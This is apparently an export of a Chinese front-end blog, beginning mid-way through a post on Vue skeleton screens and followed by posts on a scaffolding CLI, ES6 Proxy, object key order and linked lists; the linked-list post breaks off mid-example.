1node skeleton.js 此时，index.html 中的ssr占位符就被替换成了骨架屏dom 启动/编译 123npm run devnpm run build 分析：这种方式不好之处在于骨架屏dom是手动生成的，如果修改UI，更换了骨架屏，又需要重新生成，比较麻烦。 vue-skeleton-webpack-plugin单页面生成单骨架屏 安装插件 1npm i vue-skeleton-webpack-plugin -D 添加 src/entry-skeleton.js 123456789import Vue from 'vue';import Skeleton from './Skeleton';export default new Vue(&#123; components: &#123; Skeleton &#125;, template: '&lt;skeleton /&gt;'&#125;); 添加 src/Skeleton.vue 12345678910111213141516171819202122232425262728293031323334&lt;template&gt; &lt;div class="skeleton-wrapper"&gt; &lt;header class="skeleton-header"&gt;&lt;/header&gt; &lt;section class="skeleton-block"&gt; &lt;img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2aWV3Qm94PSIwIDAgMTA4MCAyNjEiPjxkZWZzPjxwYXRoIGlkPSJiIiBkPSJNMCAwaDEwODB2MjYwSDB6Ii8+PGZpbHRlciBpZD0iYSIgd2lkdGg9IjIwMCUiIGhlaWdodD0iMjAwJSIgeD0iLTUwJSIgeT0iLTUwJSIgZmlsdGVyVW5pdHM9Im9iamVjdEJvdW5kaW5nQm94Ij48ZmVPZmZzZXQgZHk9Ii0xIiBpbj0iU291cmNlQWxwaGEiIHJlc3VsdD0ic2hhZG93T2Zmc2V0T3V0ZXIxIi8+PGZlQ29sb3JNYXRyaXggaW49InNoYWRvd09mZnNldE91dGVyMSIgdmFsdWVzPSIwIDAgMCAwIDAuOTMzMzMzMzMzIDAgMCAwIDAgMC45MzMzMzMzMzMgMCAwIDAgMCAwLjkzMzMzMzMzMyAwIDAgMCAxIDAiLz48L2ZpbHRlcj48L2RlZnM+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwIDEpIj48dXNlIGZpbGw9IiMwMDAiIGZpbHRlcj0idXJsKCNhKSIgeGxpbms6aHJlZj0iI2IiLz48dXNlIGZpbGw9IiNGRkYiIHhsaW5rOmhyZWY9IiNiIi8+PHBhdGggZmlsbD0iI0Y2RjZGNiIgZD0iTTIzMCA0NGg1MzN2NDZIMjMweiIvPjxyZWN0IHdpZHRoPSIxNzIiIGhlaWdodD0iMTcyIiB4PSIzMCIgeT0iNDQiIGZpbGw9IiNGNkY2RjYiIHJ4PSI0Ii8+PHBhdGggZmlsbD0iI0Y2RjZGNiIgZD0iTTIzMCAxMThoMzY5djMwSDIzMHpNMjMwIDE4MmgzMjN2MzBIMjMwek04MTIgMTE1aDIzOHYzOUg4MTJ6TTgwOCAxODRoMjQydjMwSDgwOHpNOTE3IDQ4aDEzM3YzN0g5MTd6Ii8+PC9nPjwvc3ZnPg=="&gt; &lt;img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2aWV3Qm94PSIwIDAgMTA4MCAyNjEiPjxkZWZzPjxwYXRoIGlkPSJiIiBkPSJNMCAwaDEwODB2MjYwSDB6Ii8+PGZpbHRlciBpZD0iYSIgd2lkdGg9IjIwMCUiIGhlaWdodD0iMjAwJSIgeD0iLTUwJSIgeT0iLTUwJSIgZmlsdGVyVW5pdHM9Im9iamVjdEJvdW5kaW5nQm94Ij48ZmVPZmZzZXQgZHk9Ii0xIiBpbj0iU291cmNlQWxwaGEiIHJlc3VsdD0ic2hhZG93T2Zmc2V0T3V0ZXIxIi8+PGZlQ29sb3JNYXRyaXggaW49InNoYWRvd09mZnNldE91dGVyMSIgdmFsdWVzPSIwIDAgMCAwIDAuOTMzMzMzMzMzIDAgMCAwIDAgMC45MzMzMzMzMzMgMCAwIDAgMCAwLjkzMzMzMzMzMyAwIDAgMCAxIDAiLz48L2ZpbHRlcj48L2RlZnM+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwIDEpIj48dXNlIGZpbGw9IiMwMDAiIGZpbHRlcj0idXJsKCNhKSIgeGxpbms6aHJlZj0iI2IiLz48dXNlIGZpbGw9IiNGRkYiIHhsaW5rOmhyZWY9IiNiIi8+PHBhdGggZmlsbD0iI0Y2RjZGNiIgZD0iTTIzMCA0NGg1MzN2NDZIMjMweiIvPjxyZWN0IHdpZHRoPSIxNzIiIGhlaWdodD0iMTcyIiB4PSIzMCIgeT0iNDQiIGZpbGw9IiNGNkY2RjYiIHJ4PSI0Ii8+PHBhdGggZmlsbD0iI0Y2RjZGNiIgZD0iTTIzMCAxMThoMzY5djMwSDIzMHpNMjMwIDE4MmgzMjN2MzBIMjMwek04MTIgMTE1aDIzOHYzOUg4MTJ6TTgwOCAxODRoMjQydjMwSDgwOHpNOTE3IDQ4aDEzM3YzN0g5MTd6Ii8+PC9nPjwvc3ZnPg=="&gt; &lt;/section&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: 'skeleton'&#125;;&lt;/script&gt;&lt;style scoped&gt;.skeleton-header &#123; height: 152px; background: grey; margin-top: 60px; width: 152px; margin: 60px auto;&#125;.skeleton-block &#123; display: flex; flex-direction: column; padding-top: 8px;&#125;&lt;/style&gt; 配置 skeleton router自行配置router，方便访问调试骨架屏，略。 添加 build/webpack.skeleton.conf.js 12345678910111213141516171819202122232425'use strict';const path = require('path')const merge = require('webpack-merge')const baseWebpackConfig = require('./webpack.base.conf')const nodeExternals = require('webpack-node-externals')function resolve(dir) &#123; return path.join(__dirname, dir)&#125;module.exports = merge(baseWebpackConfig, &#123; target: 'node', devtool: false, entry: &#123; app: resolve('../src/entry-skeleton.js') &#125;, output: Object.assign(&#123;&#125;, baseWebpackConfig.output, &#123; libraryTarget: 'commonjs2' &#125;), externals: nodeExternals(&#123; allowlist: /\.css$/ &#125;), plugins: []&#125;) 在 build/webpack.dev.conf.js 和 build/webpack.prod.conf.js 中分别加入插件配置 1234567const SkeletonWebpackPlugin = require('vue-skeleton-webpack-plugin')// plugins:new SkeletonWebpackPlugin(&#123; webpackConfig: require('./webpack.skeleton.conf'), quiet: true&#125;), 修改 main.js 1234567891011121314151617181920212223242526272829303132import Vue from 'vue'import App from './App'import router from './router'import './assets/common.css'Vue.config.productionTip = false/* eslint-disable no-new *//* new Vue(&#123; el: '#app', router, components: &#123; App &#125;, template: '&lt;App/&gt;'&#125;) */// 改写let app = new Vue(&#123; router, components: &#123; App &#125;, template: '&lt;App/&gt;'&#125;)window.mountApp = () =&gt; &#123; app.$mount('#app')&#125;if (process.env.NODE_ENV === 'production') &#123; if (window.STYLE_READY) &#123; window.mountApp() &#125;&#125; else &#123; window.mountApp()&#125; 修改 index.html 123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;meta name="viewport" content="width=device-width,initial-scale=1.0"&gt; &lt;title&gt;skeleton-demo&lt;/title&gt; &lt;% for (var jsFilePath of htmlWebpackPlugin.files.js) &#123; %&gt; &lt;link rel="preload" href="&lt;%= jsFilePath %&gt;" as="script"&gt; &lt;% &#125; %&gt; &lt;% for (var cssFilePath of htmlWebpackPlugin.files.css) &#123; %&gt; &lt;link rel="preload" href="&lt;%= cssFilePath %&gt;" as="style" onload="this.onload=null;this.rel='stylesheet';window.STYLE_READY=1;window.mountApp&amp;&amp;window.mountApp();"&gt; &lt;noscript&gt;&lt;link rel="stylesheet" href="&lt;%= cssFilePath %&gt;"&gt;&lt;/noscript&gt; &lt;% &#125; %&gt; &lt;script&gt;!function(t)&#123;"use strict";t.loadCSS||(t.loadCSS=function()&#123;&#125;);var e=loadCSS.relpreload=&#123;&#125;;if(e.support=function()&#123;var e;try&#123;e=t.document.createElement("link").relList.supports("preload")&#125;catch(t)&#123;e=!1&#125;return function()&#123;return e&#125;&#125;(),e.bindMediaToggle=function(t)&#123;function e()&#123;t.media=a&#125;var a=t.media||"all";t.addEventListener?t.addEventListener("load",e):t.attachEvent&amp;&amp;t.attachEvent("onload",e),setTimeout(function()&#123;t.rel="stylesheet",t.media="only x"&#125;),setTimeout(e,3e3)&#125;,e.poly=function()&#123;if(!e.support())for(var a=t.document.getElementsByTagName("link"),n=0;n&lt;a.length;n++)&#123;var o=a[n];"preload"!==o.rel||"style"!==o.getAttribute("as")||o.getAttribute("data-loadcss")||(o.setAttribute("data-loadcss",!0),e.bindMediaToggle(o))&#125;&#125;,!e.support())&#123;e.poly();var a=t.setInterval(e.poly,500);t.addEventListener?t.addEventListener("load",function()&#123;e.poly(),t.clearInterval(a)&#125;):t.attachEvent&amp;&amp;t.attachEvent("onload",function()&#123;e.poly(),t.clearInterval(a)&#125;)&#125;"undefined"!=typeof exports?exports.loadCSS=loadCSS:t.loadCSS=loadCSS&#125;("undefined"!=typeof global?global:this);&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="app"&gt;&lt;/div&gt; &lt;!-- built files will be auto injected --&gt; &lt;/body&gt;&lt;/html&gt; 启动/编译 123npm run devnpm run build 单页面生成多骨架屏什么是多骨架屏，顾名思义。多个骨架屏，可以针对不同的页面设置不同的骨架屏，实际上这种才是比较合理的。比如底部有四个tab，都作为一级入口，用户随便从哪个入口进入都可以看到对应的骨架屏。 安装插件 1npm i vue-skeleton-webpack-plugin -D 添加 src/skeleton.js 12345678910111213141516import Vue from 'vue';import Skeleton1 from './components/skeleton/Skeleton1';import Skeleton2 from './components/skeleton/Skeleton2';export default new Vue(&#123; components: &#123; Skeleton1, Skeleton2 &#125;, template: ` &lt;div&gt; &lt;skeleton1 id="skeleton1" style="display:none"/&gt; &lt;skeleton2 id="skeleton2" style="display:none"/&gt; &lt;/div&gt; `&#125;); 添加骨架屏添加 components/skeleton/Skeleton1.vue 和 components/skeleton/Skeleton2.vue，内容略 配置 skeleton router配置router，方便访问骨架屏，便于调试，略 添加 build/webpack.skeleton.conf.js 123456789101112131415161718192021222324252627282930313233343536373839'use strict';const path = require('path')const merge = require('webpack-merge')const baseWebpackConfig = require('./webpack.base.conf')const nodeExternals = require('webpack-node-externals')const utils = require('./utils')const config = require('../config')const isProduction = process.env.NODE_ENV === 'production'const sourceMapEnabled = isProduction ? config.build.productionSourceMap : config.dev.cssSourceMapfunction resolve(dir) &#123; return path.join(__dirname, dir)&#125;let skeletonWebpackConfig = merge(baseWebpackConfig, &#123; target: 'node', devtool: false, entry: &#123; app: resolve('../src/entry-skeleton.js') &#125;, output: Object.assign(&#123;&#125;, baseWebpackConfig.output, &#123; libraryTarget: 'commonjs2' &#125;), externals: nodeExternals(&#123; whitelist: /\.css$/ &#125;), plugins: []&#125;)// important: enable extract-text-webpack-pluginskeletonWebpackConfig.module.rules[0].options.loaders = utils.cssLoaders(&#123; sourceMap: sourceMapEnabled, extract: true&#125;),module.exports = skeletonWebpackConfig 在 build/webpack.dev.conf.js 和 build/webpack.prod.conf.js 中分别加入插件配置 123456789101112131415161718192021const SkeletonWebpackPlugin = require('vue-skeleton-webpack-plugin')// plugins:new SkeletonWebpackPlugin(&#123; webpackConfig: require('./webpack.skeleton.conf'), quiet: true, minimize: true, router: &#123; mode: 'hash', routes: [ &#123; path: '/', skeletonId: 'skeleton1' &#125;, &#123; path: '/user', skeletonId: 'skeleton2' &#125; ] &#125;&#125;), 启动/编译 123npm run devnpm run build 此时，访问 / 可以看到skeleton1，访问 /user 可以看到skeleton2 多页面生成多骨架屏通过 Puppeteer 运行页面，自动生成骨架屏。 待补充… page-skeleton-webpack-plugin 安装插件 1npm i page-skeleton-webpack-plugin -D 因为内部使用 puppeteer，安装比较慢，可能会失败。如果失败，采用 cnpm 来安装，先 cnpm install，再用 cnpm 安装该插件 引入插件 build/webpack.deve.conf.js 1234567const &#123; SkeletonPlugin &#125; = require('page-skeleton-webpack-plugin')new SkeletonPlugin(&#123; pathname: path.resolve(__dirname, '../shell'), // 开发环境中点击保存按钮生成的骨架屏代码的保存路径 staticDir: path.resolve(__dirname, '../dist'), // 打包时生成的骨架屏的静态资源文件(官方文档指导要和webpack打包输出目录一致) routes: ['/'] // 需要生成骨架屏的路由(和项目中路由配置的path一致，history模式)&#125;) 本地运行 1npm run dev 提示找不到 webpack-log 安装 webpack-log 1npm i webpack-log -D 开发环境运行 1npm run dev 生成 shell在chrome控制台输入 toggleBar，在页面顶部会显示一个区域，点击它就会开启一个窗口 http://****/preview.html 选择对应的route生成html，可以修改和保存 上面的一系列操作都是在开发环境中进行实践的，目的是为了生成骨架屏的代码。那现在就需要将骨架屏应用到生产环境中。 生成环境写入骨架屏配置，和 dev 环境一致 在根模板 index.html 中添加注释 &lt;!-- shell --&gt; 123&lt;div id="app"&gt; &lt;!-- shell --&gt;&lt;/div&gt; 这里需要注意webpack的html-webpack-plugin有一项关于压缩移除注释的配置，手脚架在生成项目的时侯，这个配置项默认设置为true，即移除模板中的注释。但是在骨架屏这里，这个注释是必须存在的。因此我们需要将这个压缩移除注释的配置项修改为false，即保留注释，否则在后面的项目打包部署后，骨架屏是不会生效的。 12345new HtmlWebpackPlugin(&#123; minify: &#123; removeComments: false // 压缩移除注释的配置项修改为false &#125;&#125;) 打包编译 1npm run build 其他： 参数配置设备列表 dps可以截取任何页面，生成骨架屏结构，根据已经完成UI的页面生成骨架屏。 安装插件 1npm i draw-page-structure -g 初始化，生成 dps.config.js 1dps init 在 config 文件中可以设置想要生成的页面、dom、出口地址，以及一些个性化的配置 启动 1dps start 完成之后就会在当前目录生成一个骨架屏，可以将生成的结构直接拷贝到我们需要的页面。 ssr方案vue-skeleton-webpack-plugin插件方案插件vue-skeleton-webpack-plugin插件page-skeleton-webpack-plugin插件dps其他相关]]></content>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何让js变量变成可执行]]></title>
    <url>%2Fblog%2Fjavascript%2F%E5%A6%82%E4%BD%95%E8%AE%A9js%E5%8F%98%E9%87%8F%E5%8F%98%E6%88%90%E5%8F%AF%E6%89%A7%E8%A1%8C.html</url>
    <content type="text"><![CDATA[12345function func() &#123; var a = 1 console.log('执行了..., 打印出：' + a)&#125;func() 通常我们想处理一段逻辑时，需要使用函数/方法，那么如何使用字符串来执行一个方法呢？？？ 可以巧妙的使用 Object.defineProperty() 方法 12345678910111213141516var a = falseObject.defineProperty(window, 'toggle', &#123; get() &#123; a = !a console.log('a:', a) return '🐶' &#125;&#125;)// 执行奇数次// a: true// 🐶// 执行偶数次// a: false// 🐶 这样就可以通过直接调用 toggle，来实现我们平常的 toggle()。在一些开发者调试工具中，开发人员通过向控制台输入变量达到切换开关的目的，这样比执行函数更叫方便、更加巧妙。]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[创建脚手架工具]]></title>
    <url>%2Fblog%2Ftools%2F%E5%88%9B%E5%BB%BA%E8%84%9A%E6%89%8B%E6%9E%B6%E5%B7%A5%E5%85%B7.html</url>
    <content type="text"><![CDATA[引入我们在初始vue-cli的时候，经常使用如下的命令1vue init webpack test 那么是怎么实现的呢？如何自己搭建一个cli工具。 搭建具体流程 新建一个 ***-cli 的文件夹，如 cpm-cli npm init 初始化一个package.json 编写自动化下载的脚本 使用 gitlab group 或 github organization 存储脚手架项目 使用 gitlab api 或 github api 读取项目列表以 github 为例：https://api.github.com/orgs/${orgName}/repos 使用交互式命令供用户选择项目 使用 gitlab api 或 github api 下载脚手架以 github 为例：github:${orgName}/${project} 重写package.json等文件 npm publish npm包 commander：解析命令行 download-git-repo：下载git仓库 inquirer：交互式命令 axios：调用github接口 fs：读取和修改文件 ora：控制台输出loading chalk：控制台输出不同颜色的文案 symbols：控制台console前面的类型 注意事项 入口文件顶部：#!/usr/bin/env node package.json添加：”bin”: { “cpm-cli”: “index.js” } 安装依赖包时使用-S安装，不要使用-D安装 调用program.parse(process.argv)时需要单独写，不要和其他的一起链式调用 download脚手架偶尔会报错“被拒绝连接connect ECONNREFUSED”，稍后重试即可 需要配置github ssh key，否则无法download 代码访问github123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177#!/usr/bin/env node'use strict'/** * cli脚手架搭建参考： * https://developer.github.com/v3/ * https://www.jianshu.com/p/edeff714e8a3 * https://blog.csdn.net/weixin_38080573/article/details/97897767 * * 注意： * 入口文件顶部添加：#!/usr/bin/env node * package.josn添加："bin": &#123; "cpm-cli": "index.js" &#125; */const program = require('commander');const download = require('download-git-repo');const inquirer = require('inquirer');const axios = require('axios');const fs = require('fs');const ora = require('ora');const chalk = require('chalk'); // green/success、red/error、yellow/tipconst symbols = require('log-symbols');// configconst orgName = 'cpm-cli'; // github organization name/** * 抓取github api获取脚手架列表 */function getOrgTemplateList () &#123; return new Promise((resolve, reject) =&gt; &#123; const spinner = ora(chalk.yellow('Request template list ...')); spinner.start(); axios .get(`https://api.github.com/orgs/$&#123;orgName&#125;/repos`) .then(res =&gt; &#123; if (res.data &amp;&amp; res.data.length) &#123; const list = res.data.map(item =&gt; item.full_name.replace(`$&#123;orgName&#125;/`, '')); spinner.succeed(); resolve(list); &#125; else &#123; spinner.fail(); reject(); &#125; &#125;) .catch((err) =&gt; &#123; spinner.fail(); reject(err); &#125;) &#125;)&#125;/** * 交互式命令获取用户输入和选择 * @param &#123;Array&#125; list 脚手架列表 */function showInquirer (list) &#123; return new Promise((resolve, reject) =&gt; &#123; inquirer .prompt([ &#123; type: 'input', message: 'please input package.json name', name: 'name', default: 'demo' &#125;, &#123; type: 'input', message: 'please input package.json description', name: 'description', default: 'a demo project' &#125;, &#123; type: 'input', message: 'please input package.json author', name: 'author', default: 'chenpengmin' &#125;, &#123; type: 'list', message: 'please choice template', name: 'template', choices: list &#125; ]) .then((answers) =&gt; &#123; resolve(answers); &#125;) .catch((err) =&gt; &#123; reject(err); &#125;) &#125;)&#125;/** * 下载脚手架 * @param &#123;Object&#125; answers * @param &#123;String&#125; projectName */function downloadTemp (answers, projectName) &#123; return new Promise((resolve, reject) =&gt; &#123; const spinner = ora(chalk.yellow(`Downloading $&#123;answers.template&#125; template ...`)); spinner.start(); download(`github:$&#123;orgName&#125;/$&#123;answers.template&#125;`, projectName, &#123; clone: true &#125;, (err) =&gt; &#123; if (err) &#123; spinner.fail(); reject(err); return; &#125; spinner.succeed(); resolve(); &#125;) &#125;)&#125;/** * 重写package.json，修改name、description、author等参数 * @param &#123;Object&#125; answers * @param &#123;String&#125; projectName */function rewritePackageJson (answers, projectName) &#123; const &#123; name, description, author &#125; = answers; const packagePath = `$&#123;projectName&#125;/package.json`; if (fs.existsSync(packagePath)) &#123; const packageJson = fs.readFileSync(packagePath); const packageResult = JSON.stringify( Object.assign( &#123;&#125;, JSON.parse(packageJson), &#123; name, description, author &#125; ), null, '\t' ); fs.writeFileSync(packagePath, packageResult); &#125;&#125;/** * 主方法 * @param &#123;String&#125; projectName */async function main (projectName) &#123; try &#123; // 第一步：读取github organization列表 const list = await getOrgTemplateList(); // 第二步：交互式命令获取用户选择 const answers = await showInquirer(list); // 第三步：下载脚手架 await downloadTemp(answers, projectName); // 第四步：重写package.json rewritePackageJson(answers, projectName); console.log(symbols.success, chalk.green(`project $&#123;projectName&#125; was created successfully`)); &#125; catch (err) &#123; console.log(symbols.error, chalk.red(err || 'something was wrong')); &#125;&#125;program .version(require('./package.json').version) .command('init &lt;projectName&gt;') .action((projectName) =&gt; &#123; if (fs.existsSync(projectName)) &#123; console.log(symbols.error, chalk.red(`project $&#123;projectName&#125; already exist`)); return; &#125; main(projectName); &#125;)program.parse(process.argv); 12345678910111213141516171819202122232425262728293031&#123; "name": "cpm-cli", "version": "0.1.7", "description": "cpm-cli", "main": "index.js", "scripts": &#123; "test": "echo \"Error: no test specified\" &amp;&amp; exit 1" &#125;, "author": "chenpengmin", "homepage": "https://github.com/cpm828/cpm-cli", "keywords": [ "cli", "cpm", "cpm-cli" ], "license": "ISC", "bin": &#123; "cpm-cli": "index.js" &#125;, "dependencies": &#123; "axios": "^0.19.2", "chalk": "^4.1.0", "commander": "^5.1.0", "download-git-repo": "^3.0.2", "fs": "0.0.1-security", "inquirer": "^7.2.0", "log-symbols": "^4.0.0", "ora": "^4.0.4", "shell": "^0.5.0" &#125;&#125;]]></content>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ES6 Proxy方法]]></title>
    <url>%2Fblog%2Fes6%2Fes6-proxy.html</url>
    <content type="text"><![CDATA[什么是Proxy?Proxy 对象用于定义基本操作的自定义行为（如属性查找、赋值、枚举、函数调用等） 其实就是在对目标对象操作之前提供拦截，可以对外界的操作进行过滤和改写，修改某些操作的默认行为，这样我们可以不直接操作对象本身，而是通过操作对象的代理对象来间接操作对象，达到预期目的。 看个例子：1234567891011121314151617181920let obj = &#123; a: 1&#125;let proxyObj = new Proxy(obj, &#123; get: function (target, prop) &#123; return prop in target ? target[prop] : 0 &#125;, set: function (target, prop, value) &#123; target[prop] = 888 &#125;&#125;)// getconsole.log(proxyObj.a) // 1console.log(proxyObj.b) // 0// setproxyObj.a = 666console.log(proxyObj.a) // 888 发现经过 Proxy 构造器中转一下之后，并没有按照我们预期的表现，Proxy在读取和设置之前都做了一次拦截。 语法1let proxy = new Proxy(target, handler) 参数 target 是 Proxy 包装的目标对象（可以是任何类型的对象，包括数组、函数、甚至另一个代理），参数 handler 也是一个对象，其属性是执行一个操作时定义代理行为的函数。handler 可以是空对象 {}，不可以设置为 null，否则会排除错误。 要想 Proxy 起作用，就不能去操作原来对象的属性，必须针对的是 Proxy 实例，否则达不到预期效果。 继续使用前面的例子：12console.log(proxyObj.b) // 0console.log(obj.b) // undefined 对于 set 方法，在作用于 proxy 实例的同时也会作用于target上。123proxyObj.a === 666console.log(proxyObj.a) // 888console.log(obj.a) // 888 APIget(target, key, receiver)get 方法用于拦截对象的读取属性操作。123456/** * target: 目标对象 * key: 目标属性 * receiver: Proxy或继承Proxy的对象 */get(target, key, receiver) 12345678var obj = &#123;name: 'Lucy'&#125;var proxy = new Proxy(obj, &#123; get: function (target, key, receiver) &#123; return key === 'name' ? `Hello $&#123;target[key]&#125;` : target[key] &#125;&#125;)console.log(p.name) // Hello Lucy 注意：如果一个属性不可配置（configurable）且不可写（writable），则 Proxy 不能修改该属性。1234567891011121314var obj = Object.defineProperties(&#123;&#125;, &#123; name: &#123; value: 'Lucy', configurable: false, writable: false &#125;&#125;)var proxy = new Proxy(obj, &#123; get: function (target, key, receiver) &#123; return key === 'name' ? `Hello $&#123;target[key]&#125;` : target[key] &#125;&#125;)console.log(proxy.name) // 报错 set(target, key, value, receiver)set 方法用于拦截对象的赋值操作。1234567/** * target: 目标对象 * key: 目标属性 * value: 目标属性值 * receiver: Proxy或继承Proxy的对象 */ set(target, key, value, receiver) 1234567891011var obj = &#123;age: 18&#125;var proxy = new Proxy(obj, &#123; set: function(target, key, value, receiver) &#123; console.log(receiver) target[key] = key === 'age' ? Math.min(value, 100) : value &#125;&#125;)proxy.age = 101console.log(proxy.age) // 100console.log(obj.age) // 100 注意：Proxy 不能进行深度代理，如：123456789var obj = &#123;borth: &#123;year: 2000, month: 6&#125;&#125;var proxy = new Proxy(obj, &#123; set: function(target, key, value, receiver) &#123; console.log(receiver) target[key] = value &#125;&#125;)proxy.borth.month = 7 has(target, key)deleteProperty(target, key)ownKeys(target) 参考：segmentfault JS基础——Proxy]]></content>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js对象乱序现象]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E5%AF%B9%E8%B1%A1%E4%B9%B1%E5%BA%8F%E7%8E%B0%E8%B1%A1.html</url>
    <content type="text"><![CDATA[背景当我们使用 for...in 遍历一个Object对象时，打印的结构是否按key的顺序打印出来呢？答案是：不一定 如case1：1234567891011121314var obj = &#123; '-1': '全部', '0' : '正常', '1' : '失效'&#125;;for (let key in obj) &#123; console.log(key, obj[key]);&#125;/*'0' 正常'1' 失效'-1' 全部*/ 解惑Object的key的排序规则到底是什么样的呢？答案是：如果key是 0、正整数或字符串0、字符串正整数，则安排从小到大排序，如果有其他的数据，安排创建顺序排列。如case2： 12345678910111213141516var obj = &#123; 'a': 1, '你' : 2, '1' : 3, '2.1' : 3&#125;;for (let key in obj) &#123; console.log(key, obj[key]);&#125;/*1 3a 1你 22.1 3*/ 解决办法对于case1，如何让key顺序输出呢？可以先将key换成非整数类型的字符串，输出的时候再还原。改造case1:12345678910111213var obj = &#123; '-1.': '全部', '0.' : '正常', '1.' : '失效'&#125;for (let key in obj) &#123; console.log(~~key, obj[key]);&#125;/*'-1' 全部'0' 正常'1' 失效*/ 但如果是case2各种数据类型混合的情况，就不能使用~~了123456789var obj = &#123; '.a': 1, '.你' : 2, '.1' : 3, '.2.1' : 3&#125;;for (let key in obj) &#123; console.log(key.substring(1), obj[key]);&#125;]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js数据结构--链表]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E9%93%BE%E8%A1%A8.html</url>
    <content type="text"><![CDATA[前端说的栈、队列，它们都是列表的一种，底层的数据结构都是数组。 但是数组并不总是最佳的数据结构，索引引入链表结构： 链表（LinkedList）介绍链表的出现是为了解决数组增删的操作，在js中，虽然存在如下方法： 尾部添加 push 尾部删除 pop 头部添加 unshift 头部删除 shift 任意位置添加删除 splice 但是与其他语言相比，效率会比较低，所以考虑使用链表（Linked-list）来替换它，链表几乎可以在任何可以使用一位数组的情况中。 链表包含： 单向链表 双向链表 单向循环列表 双向循环列表 定义链表是一组节点组成的集合，每个节点都使用一个对象的引用来指向它的后一个节点。指向另一个节点的引用称作为链。其中，data保存数据，next保存着下一个链表的引用，链表的尾元素指向null，表示结束位置。 由于链表的起始点确定比较麻烦，因此在链表的最前面添加一个特殊的节点，成为头节点，表示链表的头部，如： 用我们常见的数据结构，大致是这样： 单向链表设计链表包含两个类，一个是 Node 类用来表示节点，另一个是 LinkList 类提供增删等操作。 Node类 1234function Node(el) &#123; this.el = el // 当前节点元素 this.next = null // 下一个节点的链接&#125; LinkList类 123456789function LinkList() &#123; this.head = new Node('head') // 头结点 this.find = find // 查找结点 this.findPrev = findPrev // 查找前一个结点 this.insertAfter = insertAfter // 在某个节点后插入节点（结合find） this.insertBefore = insertBefore // 在某个节点后插入节点（结合findPrev） this.remove = remove // 删除结点（结合findPrev） this.display = display // 显示链表&#125; 下面挨个实现这些方法： find 查找节点1234567function find(el) &#123; var curNode = this.head // 从链表头部开始扫描 while(curNode.el !== el) &#123; curNode = curNode.next &#125; return curNode&#125; findPrev 查找前一个结点1234567function findPrev(el) &#123; var prevNode = this.head // 从链表头部开始扫描 while(prevNode.next !== null &amp;&amp; prevNode.next.el !== el) &#123; prevNode = prevNode.next &#125; return prevNode&#125; insertAfter 在某个节点后插入节点123456function insertAfter(newEl, el) &#123; var newNode = new Node(newEl) var curNode = this.find(el) newNode.next = curNode.next curNode.next = newNode&#125; insertBefore 在某个节点前插入节点123456function insertBefore(newEl, el) &#123; var newNode = new Node(newEl) var prevNode = this.findPrev(el) newNode.next = prevNode.next prevNode.next = newNode&#125; remove 删除节点123456function remove(el) &#123; var prevNode = this.findPrev(el) if (prev !== null) &#123; prev.next = prev.next.next &#125;&#125; display 显示链表1234567function display() &#123; var curNode = this.head // 从链表头部开始扫描 while(curNode !== null) &#123; console.log(curNode) curNode = curNode.next &#125;&#125; 全部代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465function Node(el) &#123; this.el = el // 当前节点元素 this.next = null // 下一个节点的链接&#125;function LinkList() &#123; this.head = new Node('head') // 头结点 this.find = find // 查找结点 this.findPrev = findPrev // 查找前一个结点 this.insertAfter = insertAfter // 在某个节点后插入节点（结合find） this.insertBefore = insertBefore // 在某个节点后插入节点（结合findPrev） this.remove = remove // 删除结点（结合findPrev） this.display = display // 显示链表&#125;// 查找节点function find(el) &#123; var curNode = this.head // 从链表头部开始扫描 while(curNode.el !== el) &#123; curNode = curNode.next &#125; return curNode&#125;// 查找上一个节点function findPrev(el) &#123; var prevNode = this.head // 从链表头部开始扫描 while(prevNode.next !== null &amp;&amp; prevNode.next.el !== el) &#123; prevNode = prevNode.next &#125; return prevNode&#125;// 在某个节点后插入新节点function insertAfter(newEl, el) &#123; var newNode = new Node(newEl) var curNode = this.find(el) newNode.next = curNode.next curNode.next = newNode&#125;// 在某个节点前插入新节点function insertBefore(newEl, el) &#123; var newNode = new Node(newEl) var prevNode = this.findPrev(el) newNode.next = prevNode.next prevNode.next = newNode&#125;// 删除节点function remove(el) &#123; var prevNode = this.findPrev(el) if (prevNode !== null) &#123; prevNode.next = prevNode.next.next &#125;&#125;// 显示链表function display() &#123; var curNode = this.head // 从链表头部开始扫描 while(curNode !== null) &#123; console.log(curNode) curNode = curNode.next &#125;&#125; 测试：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899var nums = new LinkList()// nums:/* &#123; ..., head: &#123; el: 'head', next: null &#125;, ...&#125; */nums.insertAfter('1', 'head') // 